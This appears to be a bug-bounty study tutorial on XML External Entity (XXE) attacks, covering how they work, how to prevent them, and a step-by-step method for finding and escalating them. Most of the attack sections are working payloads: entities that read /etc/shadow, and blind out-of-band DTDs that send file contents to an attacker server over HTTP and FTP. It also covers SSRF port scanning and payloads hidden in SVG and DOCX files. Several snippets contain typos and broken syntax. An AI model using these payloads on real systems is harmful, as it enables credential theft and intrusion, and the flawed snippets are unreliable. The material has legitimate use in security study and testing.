They're high impact vulnerabilities, because they can lead to disclosure of data, SSRFs or DoSs. They're hard to understand and exploitation.

### **Mechanisms**
XML language is designed to storing and transferring data. It is markup language that allows programs to define and present any structure of data in text format using tree-like structure. Web use XML to transfer data about identity in SAML (Security Assertion Markup Language) authorization.

This XML code can look soemthing like this:
```
<saml:AtrributeStatement>
	<saml:Attribute Name="username">
		<saml:AttributeValue>
		Michas
		</saml:AttributeValue>
	</saml:Attribute>
</saml:AttributeStatement>
```
XML is different than html because XML use user-defined tags unlike HTML.

XML documents can contain Document Type Definition (DTD), which defines structure of XML document and data that it contains. DTD definitions can be loaded from external sources or then can be declared in same document in DOCTYPE tag. Below an example of a DTD:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [ <!ENTITY file "HELLO!">
]>
<example>&file;</example>
```

Entities in XML files wokr the same as variables in programming languages. Every time you refer to the same entity by using &file, XML document will load its value. In this case all references of &file in XML document will be replaced with "HELLO!".

Documents can also loard external entities to get access to local resources or remote ones by using URL address. If value of entity is written after SYSTEM keyword it is an external entity and its value will be loaded from URL address. 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
	<!ENTITY file SYSTEM "file://example.txt">
]>
<example>&file;</example>
```
Last lines loads file entity by referring to to txt file located in file://example.txt]
External entities can also load resources from the internet: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
	<!ENTITY file SYSTEM "https://example.com/index.html">
]>
<example>&file;</example>
```

You can probably already guess where the vulnerability is. If users can control values of XML entities or external entities, that can try to disclose internal files, scan ports on targets private network and even launch DoS attacks.

Many sites that are designed to read XML documents are using old or bad-configured XML parsers. If the parser allows DTD to be defined by user or allows user to input data to DTD and is configured to parse and evaluate DTD, attacker can declare their own external entities.

Lets say that webapp allows user to transfer their own XML document. Application parses this document and show its content to the user. Threat actor can load document shown below to read files from the /etc/shadow:
```
<<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
	<!ENTITY file SYSTEM "file://etc/shadow"
]>
<example>&file;</example>
```

Those kinds of attacks are called XXE. 
They happen when application accepts user input for XML or parses user input to DTD definition, which is then parsed by XML parser.

### **To combat XXE attacks**
To prevent XXE attacks you have to limit abilities of XML parser. Because launching XXE attacks needs DTD definition processing, you should start by turning off DTD processing in XML parsers. If completely turning off DTD is not possible you can disable servicing of external entities, parametrical entities and in-built DTD. To prevent DoS done by XXE you can limit time of parsing done by XML parser.

As always you can also try to sanitize user provided input, or create [[Whitelist]]s or [[Blacklist]]s. 
You could also try to use json instead of XML for user input.

Also keep XML parsers updated, as well as all other dependencies. Most of the time XXE exists because of dependencies of application and not due to custom source code.

### **Hunt Down XXE**
#### 1st Step
First step would be localize functionalities that use XML. You should look for all places in which application gets input data in XML format or where it gets data that will be inserted into XML documents. How? I don't know.

Many applications use XML to send information via HTTP messages. To find those endpoints you should open your proxy and look throughout target app. Next aim to find documents looking like XML in html messages. Things like:
``<?xml
 or tree-like structure.

Always decode, because you will be missing a lot of clues.

Beside searching for XML in HTTP requests you should also look for functionalities of transferring files, because XML is the basis for many popular types of files. If you can transfer one of these types of files you can probably transfer XML input to XML parser. File types that are based on XML:
XML, HTML, DOCX, PPTX, XLSX, GPX, PDF, SVG, RSS. Additionally metadata of PNG, JPEG, GIF are also based on  XML. Soap functionalities are also based on XML.

Sometimes endpoints that accept other formats also accept XML due to it being overlooked. Try changing Content-Type to something like following:
 ``Content-Type: text/xml
 ``Content-Type: application/xml
 And try to provide request with XML.

#### 2nd Step
Than you should try to test found endpoints for the existence of classical XXE. You should try to upload some XXE payload and observe reaction of the application. If the application returns result of parsers, you're ready to try reading internal files by using classical XXE. Firstly find out if entities of XML are interpreted. To achieve this you have to insert entities of XML to input data of this format and look if they load properly:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Example [
	<!Entity test SYSTEM "Hello!">
]>
<example>&test;</example>
```
If they load properly try loading local files:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Example [
	<!Entity test SYSTEM "file:///etc/hostname">
]>
<example>&test;</example>
```
If keyword SYSTEM doesnt work you can try replacing it with PUBLIC. PUBLIC requires providing identifier after the keyword. You can use random String.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Example [
	<!Entity test PUBLIC "abc" "file:///etc/hostname">
]>
<example>&test;</example>
```
Not try to extract some standar files of system. 
/etc/hostname/
/etc/passwd
.bash_history
Sometimes access can be limited so try to read everything that you can and is valuable.

#### 3rd Step
If that doesn't return any XML documents you can try testing out blind XXE. Most of the blind XXE forces server to exfiltrate data and send it to attackers server.
To be sure that target server can connect to other servers you will have to force it to send request to your server. You can configure netcat to open port and then try to connect to your kali machine. You should try doing so with 80, 443 ports, because firewall might be blocking connections on other ports. After booting up netcat listener you should try injecting something like this:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Example [
	<!Entity test SYSTEM "http://server:80/xxe_test.txt">
]>
<example>&test;</example>
```
You should try lookin for any logs that trying to request xxe_test.txt.

Exfiltrating data using XXE is complicated, especially if the parser is protected against XXE and if you're trying to read files with very specific file types. Sometimes you have to exfiltrate files containing special characters of XML like <> " ' or &. Trying to get access to those files with XXE would break DTD Syntax and disturb exfiltration. There is a way however to solve this problems. In XML file special character packed in CDATA are not perceived as special characters. If you are exfiltrating XML file you can try to rewrite your malicious external DTD definition in the following way:
```
<!Entity % file System "file:////password.xml">
<!Entity % start "<![CDATA[">
<!Entity % end "]]>">
<!Entity % ent "<!ENTITY &#x25; exfiltrate 
	'https://ip_of_attacker/?%start;%file;%end;'>">
%ent;
%exfiltrate;
```
Concatenated value of the entity would be something like:
``<!Entity % exfiltrate 'http://ip_of_attacker/?<![CDATA[ZAWARTOŚĆ_Pliku]]>'>

As you can see our payloads become too complicated. To combat errors of syntax in those you can use tool like **XmlLint (https://xmllint.com)**, which helps you fight typos and errors of syntax.

At last send your normal XML payload to the target object in order to launch attack:
```
<?xml version=1.0 encoding="UTF-8:?>
<!DOCTYPE example [
<!ENTITY % xxe SYSTEM "http://serwer_atakującego/xxe.dtd">
%xxe;
]>
```
Next way to exfiltrate files with special cases is to use PHP function packaging URL addresses. If the target object is an application that is based on PHP, functions packaging PHP allow us to convert our requested data to base64 format. Thanks to that we can easily read XML files or even binary files:
```
<!ENTITY % FILE system "php://filter/convert.base64-encode/resource=/etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM
'http://attacker_server/?%file;'>">
%ent;
%exfiltrate;
```

For direct data transfer without having to worry about special case letters we can use FTP protocol. To use this protocol you have to boot up FTP server on your machine and modify DTD definition. We can use from simple server script written in Ruby which you can find here:
https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
```
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM
	`ftp://attacker_server:2121/?%file;`>">
%ent;
%exfiltrate
```

#### 4th Step
You should try to parse files containing XML payloads. Endpoints of transferring files and parsers of files aren't always protected by same mechanisms of XXE attacks as endpoints that are designed to take XML. Hiding XXE payloads in different types of files lets us transfer payloads even when application  limits types of files that you can provide. 

##### SVG
To input XXE in SVG you have to open the picture as an txt file:
```
<svg width="500" height="500">
	<circle cx="50" cy="50" r="40" fill="blue" />
</svg>
```
Then place the payload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
	<!ENTITY test SYSTEM "file:///etc/shadow"

]>
<svg width="500" height="500">
	<circle cx="50" cy="50" r="40" fill="blue" />
	<text font-size="16" x="0" y="16">&test;</text>
</svg>
```

##### Microsoft files
Documents of Microsoft Word, presentations of PowerPoints, and sheets of Excel are archival files that contain xml files so you can also place XXE payload in them. You have to first extract files of document. You can use **Unarchiver** to do so. You should see some XML files after doing so. Then you can just place payload into the file. At last pack files back into corresponding file type. To zip them up you can use following commands:
``zip -r new_example.docx *

#### 5th Step
Sometimes you can't control entire XML document and edit its DTD definition. You can still exploit XXE if the application collects input data from user and on backend it inserts it into XML documents. In this situation instead of doing above you can perform XInclude attack. 
**XInclude** is a specific functionality of an XML language, which builds new XML document from one tag of XML called xi:include. If you can control even small fragment of non-sanitized data parsed to XML you can place there your XInclude attack.

To perform XInclude input payload from below to input point and observe if the server will return requested file.
```
<example xmlns:xi="http://www.w3.org/2001/XInclude">
	<xi:include parse="text" href="file:///etc/hostname"/>
</example>
```


### **Escalation**
Escalation of this vulnerability is based on what vulnerable XML parser is allowed to do. Generally speaking you can force it to retrieve system files, source code, list of directories and for exfiltration. By using XXE you can also perform SSRF in order to scan internal network and such. Sometimes it can be used for DoS.

##### Reading Files
To read local files using XXE, just input path of local file in definition of DTD in parsed XML file. To gain access to local files you have to use following URL address scheme: ``file://path/to/file
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
	<!ENTITY file SYSTEM "file:///etc/shadow">
]>
<example>&file;</example>
```

##### SSRF
You can also try to launch SSRF by using XXE. You can try port scanning just like in [[SSRF]] attacks:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
	<!ENTITY file SYSTEM "http://10.0.0.1:80">
]>
<example>&file;</example>
```

By using XXE you can also try to launch SSRF attacks looking for instance metadata. You should always try to watch unrendered version of HTML website, because it contains much more information.

##### Using Blind XXE
Sometimes application doesn't give any feedback of XML parser. You can try to force target server to reach out to your server. Then you can monitor your server logs to download exfiltrated data.
The payload is a bit more complicated then normal, cause more often than not parsers do not allow to include external entities in different external entities. That's why Blind XXE is a bit more complicated then XXE. 
BUT DTDT definition of XML has a functionality called parametrical entities, which we can use. Parametrical entities are entities to which you can refer in other places of DTD. You declare them and refer to them with help of the % character.  Payload would look something like this:
```
<?xml version="1.0" encoding ="UTF-8">
<!DOCTYPE example [
	<!ENTITY % file SYSTEM "file:///etc/shadow">
	<!ENTITY % ent
		"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">
	%ent;
	%exfiltrate;
]>
```
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities
In the third line we declare parameter entity with name file, which has value of /etc/shadow content. 
In the 5th line we declare parameter entity with the name ent, which contains dynamic declaration of the next parameter entity called exfiltrate.
&#x25 is % coded in hexadecimal format.
Exfiltrate entity refers to attackers server with content of /etc/shadow in URL parameter. At last DTD refers to ent to declare entity exfiltrate and then refers to exfiltrate to initialize request.

If you somehow managed to send this file you will see that it doesn't work. XD
It happens because of XML specification. XML parameter entities are treated differently in default DTD definition (ones tagged with DOCTYPE) than in external DTD (separate DTD but hosted somewhere else). In default DTD you can't refer to parameter entity in tags. So to exfiltrate the data using blind XXE you have to overcome this limitation by hosting external DTD definition on your server. Try hosting xxe.dtd file:
```
<!ENTITY % file SYSTEM "file///etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM
'http://server_of_attacker/?%file;'>">
%ent;
%exfiltrate;
```
Then force the target parser so that it interpretates your definition of DTD and specify it in parameter entity that you will refer to:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
	<!ENTITY % xxe SYSTEM "http://server_of_attacker/xxe.dtd">
	%xxe;
]
```
We bypass the inability of referring to parameter object inside tag, by using our own definition of DTD.
Unfortunately whole thing will break on the first \n in /etc/shadow. 

Easier way of exfiltrating data by using blind XXE is to force parser to return error description back to us. We can try to refer to non-existent file as a value of external entity so we will force File Not Found:
```
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/?%file;'>">
%ent;
%error;
```
We're using /etc/shadow content as a parameter in URL pointing to non-existent file. Now we can send object o the target machine to launch an attack.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE examole [
	 <!ENTITY % xxe SYSTEM "http://server_of_attacker/xxe.dtd">
 %xxe;
]
```
This definition of DTD will send us content of a file by sending us one line of stack trace
It will look like this:
``java.io.FileNotFoundException: file:///nonexistent/CONTENT OF FILE THAT WE WANTED TO READ, AND MORE CONTENT FROM THAT FILE AND MORE CONTENT
It is just one line, it is long but still one line.

##### DoS
I won't write much about this due to nature of this vulnerability. At least 95% of bug bounty programs won't allow using this so I will just paste here some wikipedia links
Attack is called billion laughs attack or XML bomb.
https://en.wikipedia.org/wiki/Billion_laughs_attack